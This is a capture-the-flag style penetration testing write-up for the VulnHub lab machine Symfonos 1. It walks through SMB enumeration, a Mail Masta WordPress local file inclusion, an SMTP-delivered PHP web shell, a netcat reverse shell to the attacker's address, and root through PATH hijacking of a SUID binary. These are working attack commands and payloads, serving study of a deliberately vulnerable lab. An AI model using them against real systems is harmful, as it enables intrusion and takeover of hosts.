# 📝 Penetration Testing Report

# 🎯 VulnHub — Symfonos 1

> **📌 Platform:** VulnHub  
> **🖥️ Lab Machine:** Symfonos 1  
> **💻 Attacking Machine:** Kali Linux  
> **🌐 Environment:** Oracle VirtualBox — Host-Only Network

---

# 📖 Overview

The objective of this assessment was to perform a full penetration test against the **Symfonos 1** virtual machine.

The assessment followed a structured methodology:

- Host discovery
- Service enumeration
- SMB enumeration
- Credential discovery
- Authenticated SMB access
- Web application enumeration
- WordPress enumeration
- Vulnerability research
- Local File Inclusion exploitation
- SMTP interaction
- Web shell execution
- Reverse shell
- Local privilege escalation
- Root access

The final compromise was achieved by chaining several weaknesses together rather than relying on a single vulnerability.

---

# 🧠 Attack Chain

```
Host Discovery
      │
      ▼
Port Enumeration
      │
      ├───────────────┐
      ▼               ▼
   HTTP              SMB
      │               │
      │               ▼
      │       Anonymous SMB Access
      │               │
      │               ▼
      │       Weak Password Discovery
      │               │
      │               ▼
      │       Authenticated SMB Access
      │               │
      │               ▼
      │       Information Disclosure
      │               │
      │               ▼
      │          /h3l105/
      │               │
      ▼               ▼
WordPress ◄───────────┘
      │
      ▼
Mail Masta Plugin
      │
      ▼
Local File Inclusion
      │
      ▼
SMTP Service
      │
      ▼
Web Shell
      │
      ▼
Reverse Shell
      │
      ▼
SUID Enumeration
      │
      ▼
statuscheck
      │
      ▼
PATH Hijacking
      │
      ▼
Root
```

---

# 🛰️ 1. Host Discovery

## 🎯 Objective

Identify the IP address of the target machine in the isolated lab network.

## 🔎 Methodology

Because the machine was running inside a VirtualBox Host-Only network, ARP scanning was used to identify active hosts.

```
sudo arp-scan -I eth1 192.168.96.0/24
```

The target was identified as:

```
192.168.96.18
```

The hostname reported by Nmap was:

```
symfonos.local
```

### Analysis

After identifying the target IP address, the next step was to determine which network services were exposed.

---

# 🔍 2. Service Enumeration

## 🎯 Objective

Identify open ports, running services, and their versions.

```
sudo nmap -sV -A 192.168.96.18
```

The scan identified the following services:

|Port|Service|Version|
|---|---|---|
|22|SSH|OpenSSH 7.4p1|
|25|SMTP|Postfix|
|80|HTTP|Apache 2.4.25|
|139|SMB|Samba 3.x–4.x|
|445|SMB|Samba 4.5.16|

### Analysis

Several services were potentially interesting.

The web server did not immediately expose significant information, while SMB provided a promising attack surface because Samba was accessible and Nmap identified guest-level enumeration.

Therefore, SMB was investigated further.

---

# 📂 3. SMB Enumeration

## 🎯 Objective

Identify available SMB shares, users, and possible anonymous access.

Additional enumeration was performed with Nmap.

```
nmap --script smb-enum-shares,smb-enum-users -p139,445 192.168.96.18
```

The following shares were identified:

```
print$
helios
anonymous
IPC$
```

Most importantly, the `anonymous` share allowed anonymous access.

The SMB service also revealed the following user:

```
helios
```

To manually enumerate the shares:

```
smbclient -L //192.168.96.18
```

The available shares included:

```
Sharename       Type
---------       ----
print$          Disk
helios          Disk
anonymous       Disk
IPC$            IPC
```

### Analysis

The anonymous share provided an opportunity to retrieve files without authentication.

This became the next focus of the investigation.

---

# 📄 4. Anonymous SMB Access

## 🎯 Objective

Determine whether the anonymous SMB share contained sensitive information.

After connecting to the anonymous share, a file was discovered and downloaded to the attacking machine.

The file contained the following warning:

```
Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'!
Next person I find using one of these passwords will be fired!

-Zeus
```

### Analysis

The message disclosed three potential passwords:

```
epidioko
qwerty
baseball
```

It also provided a potential username discovered during SMB enumeration:

```
helios
```

At this point, the information from two separate SMB enumeration stages could be combined:

```
Username: helios

Potential passwords:
- epidioko
- qwerty
- baseball
```

The credentials were then tested **against SMB access**, rather than SSH.

One of the passwords was valid, providing authenticated access to the `helios` SMB share.

> **Important:** This stage resulted in authenticated **SMB access to the `helios` share**. It was not an SSH login.

---

# 📥 5. Authenticated SMB Enumeration

## 🎯 Objective

Analyze the contents of the `helios` SMB share for additional information.

After authenticating to the share, two files were discovered and downloaded for analysis.

One contained information that was not directly useful for exploitation.

The second file contained the following information:

```
1. Binge watch Dexter
2. Dance
3. Work on /h3l105
```

The third item appeared to reference an internal web directory:

```
/h3l105
```

### Analysis

This was the first strong indication that the SMB information could be used to discover an additional web application.

The investigation therefore moved back to the HTTP service.

---

# 🌐 6. Web Application Discovery

## 🎯 Objective

Investigate the `/h3l105/` directory discovered through SMB.

The application was accessible at:

```
http://symfonos.local/h3l105/
```

Further enumeration was performed with WhatWeb:

```
whatweb http://symfonos.local/h3l105/
```

The scan identified:

- Apache 2.4.25
- Debian Linux
- WordPress 5.2.2
- jQuery

The page title was:

```
helios site – Just another WordPress site
```

### Analysis

The presence of WordPress significantly expanded the attack surface.

The next step was to enumerate the WordPress installation and identify installed components.

---

# 📁 7. WordPress Enumeration

## 🎯 Objective

Identify WordPress directories, plugins, and potentially vulnerable components.

Directory enumeration was performed:

```
gobuster dir \
-u http://symfonos.local/h3l105/ \
-w /usr/share/wordlists/dirb/common.txt
```

The following WordPress directories were identified:

```
wp-admin
wp-includes
wp-content
xmlrpc.php
```

Since `wp-content` was accessible, the next step was to enumerate installed plugins.

```
gobuster dir \
-u http://symfonos.local/h3l105/ \
-w /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt
```

The following plugins were discovered:

```
akismet
hello.php
mail-masta
site-editor
```

### Analysis

Among the discovered plugins, **Mail Masta** attracted particular attention because vulnerable versions were known to contain a Local File Inclusion vulnerability.

This hypothesis was investigated using vulnerability databases.

---

# 🔎 8. Vulnerability Research — Mail Masta

## 🎯 Objective

Determine whether the installed Mail Masta plugin contained a known vulnerability.

SearchSploit was used to search for publicly documented vulnerabilities:

```
searchsploit WordPress Plugin Mail Masta
```

A relevant vulnerability was identified:

```
WordPress Plugin Mail Masta 1.0 - Local File Inclusion
```

The exploit information was retrieved with:

```
searchsploit -m php/webapps/40290.txt
```

The exploit description identified the vulnerable source file:

```
/inc/campaign/count_of_send.php
```

and the vulnerable code:

```
include($_GET['pl']);
```

### Analysis

The `pl` parameter was directly passed to the PHP `include()` function.

This indicated that arbitrary local files could potentially be read from the server.

---

# 📄 9. Local File Inclusion

## 🎯 Objective

Validate the identified LFI vulnerability.

The following path was requested:

```
/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

The contents of `/etc/passwd` were successfully returned.

Among the discovered accounts was:

```
mail
```

### Analysis

The successful retrieval of `/etc/passwd` confirmed arbitrary local file inclusion.

The presence of the `mail` user also provided additional confirmation that the target was running a mail service, which was consistent with the SMTP service identified during the initial Nmap scan.

At this point, the SMTP service became the next logical target for investigation.

---

# ✉️ 10. SMTP Enumeration

## 🎯 Objective

Determine whether the SMTP service could be leveraged to deliver content to the web application.

A connection was established using Telnet:

```
telnet 192.168.96.18 25
```

The SMTP conversation began with:

```
HELO example.com
```

The server responded:

```
250 symfonos.localdomain
```

The `RCPT TO` command confirmed that a recipient could be specified as:

```
RCPT TO:Helios
```

The session was then continued using the `DATA` command.

### Analysis

The ability to interact with the SMTP service provided an additional avenue for delivering content to the target.

A PHP web shell was prepared:

```
system($_GET['cmd']);
```

The intention was to use the web-accessible environment to execute operating-system commands.

---

# 💻 11. Web Shell

## 🎯 Objective

Obtain command execution on the target system.

The PHP payload was delivered through the SMTP service and subsequently accessed through the web application.

The resulting web shell allowed operating-system commands to be supplied through the URL.

This provided command execution under the privileges of the web server.

### Analysis

Although command execution had been achieved, the web shell was not a convenient interactive shell.

Therefore, the next objective was to obtain a proper reverse shell.

---

# 🔄 12. Reverse Shell

## 🎯 Objective

Convert web command execution into an interactive shell.

The reverse shell connection was initiated toward the attacking machine:

```
nc -e /bin/bash 192.168.96.3 1234
```

On the Kali machine, Netcat was placed into listening mode:

```
nc -lvnp 1234
```

A reverse shell was successfully received.

To improve shell usability, the availability of Python was checked:

```
which python
```

Python was available, so a pseudo-terminal was spawned:

```
python -c "import pty; pty.spawn('/bin/bash')"
```

### Analysis

An interactive shell was now available, allowing local enumeration of the compromised system.

---

# 🔎 13. Local Enumeration

## 🎯 Objective

Determine the current privileges, system information, and possible privilege-escalation vectors.

The following commands were executed:

```
id
pwd
hostname
uname -ar
```

No immediately exploitable information was identified.

Therefore, the investigation moved to SUID binaries.

---

# 🔐 14. SUID Enumeration

## 🎯 Objective

Identify binaries executing with elevated privileges.

The following command was used:

```
find / -perm -4000 2>/dev/null
```

A potentially interesting SUID executable was discovered:

```
statuscheck
```

Further analysis showed that the program internally executed the `curl` command.

### Analysis

Because the binary was running with elevated privileges and relied on an external executable, the `PATH` variable became a potential attack vector.

The next step was to determine whether command execution could be redirected to an attacker-controlled binary.

---

# 💥 15. PATH Hijacking

## 🎯 Objective

Exploit the SUID binary by manipulating the command search path.

A malicious replacement for `curl` was created in `/tmp`:

```
echo "/bin/sh" > /tmp/curl
```

The file was made executable.

The `PATH` environment variable was then modified:

```
export PATH=/tmp:$PATH
```

As a result, when `statuscheck` attempted to execute:

```
curl
```

the shell searched `/tmp` before the legitimate system directories.

The malicious `/tmp/curl` executable was therefore executed instead.

### Analysis

Because `statuscheck` was executed with elevated privileges, the malicious command inherited those privileges.

This resulted in a root shell.

---

# 👑 16. Root Access

After successful exploitation, the current privileges were verified:

```
id
```

The result confirmed:

```
uid=0(root)
```

The root directory was then accessed and the flag was obtained.

```
cd /root
```

The flag file was located in the root user's home directory.

---

# ⚠️ Findings

|Finding|Risk|
|---|---|
|Anonymous SMB share with readable files|🟠 High|
|Sensitive information disclosed through SMB|🟠 High|
|Weak/reused credentials|🔴 Critical|
|WordPress 5.2.2|🟠 High|
|Vulnerable Mail Masta plugin|🔴 Critical|
|Local File Inclusion|🔴 Critical|
|Dangerous SMTP configuration|🔴 Critical|
|Arbitrary command execution|🔴 Critical|
|SUID binary vulnerable to PATH hijacking|🔴 Critical|
|Root privilege escalation|🔴 Critical|

---

# 📌 Key Observations

The compromise was achieved through a chain of individually identifiable weaknesses.

The most important stages were:

1. **Anonymous SMB access** exposed internal information.
2. The exposed information revealed weak passwords.
3. One of these passwords provided authenticated access to the **`helios` SMB share**.
4. Files on the share revealed the `/h3l105` web application.
5. The application was identified as **WordPress 5.2.2**.
6. WordPress enumeration revealed the vulnerable **Mail Masta** plugin.
7. The plugin's LFI vulnerability allowed `/etc/passwd` to be read.
8. SMTP was subsequently investigated based on the information gathered during enumeration.
9. SMTP interaction was used to deliver a PHP web shell.
10. The web shell was converted into an interactive reverse shell.
11. Local enumeration revealed the SUID `statuscheck` binary.
12. `statuscheck` relied on `curl`, allowing a **PATH hijacking** attack.
13. The malicious `curl` executable was executed with elevated privileges.
14. Full **root access** was obtained.